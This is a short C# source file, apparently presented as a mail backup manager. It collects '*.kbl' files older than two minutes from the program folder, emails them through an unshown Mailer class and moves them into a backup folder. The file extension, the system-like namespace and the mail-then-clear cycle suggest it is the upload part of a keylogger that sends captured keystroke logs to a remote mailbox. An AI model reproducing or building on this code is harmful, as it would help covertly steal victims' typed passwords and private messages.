using System;
using System.IO;
using System.Linq;

namespace sys.app.backup
{
  public static class Manager
  {
    public static void Backup(object sender)
    {
      try
      {
        BackupMailInternal();
      }
      catch (Exception e)
      {
        Console.WriteLine(e);
      }
    }

    private static bool BackupMailInternal()
    {
      var mailer = new Mailer();
      var path = AppDomain.CurrentDomain.BaseDirectory;
      var files = Directory.EnumerateFiles(path, "*.kbl").ToList()
        .Where(x => DateTime.Now - new FileInfo(x).CreationTime > TimeSpan.FromMinutes(2)).ToList();

      if (!files.Any())
        return true;

      if (!mailer.Send(files))
        return false;

      var backupDirectory = Path.Combine(path, "backup");

      try
      {
        if (!Directory.Exists(backupDirectory))
          Directory.CreateDirectory(backupDirectory);
      }
      catch (Exception e)
      {
        Console.WriteLine(e);
        File.AppendAllText($"log_{DateTime.Now.Date:yy-MM-dd}.txt",
          $"Directory create exception: {e}{Environment.NewLine}");
        throw;
      }

      foreach (var file in files)
      {
        try
        {
          var fileName = Path.GetFileName(file);
          var newPath = Path.Combine(backupDirectory, fileName);
          if (File.Exists(newPath))
            File.Delete(newPath);

          File.Move(file, newPath);
        }
        catch (Exception e)
        {
          Console.WriteLine(e);
          File.AppendAllText($"log_{DateTime.Now.Date:yy-MM-dd}.txt", $"File move exception: {e}{Environment.NewLine}");
        }
      }

      return true;
    }
  }
}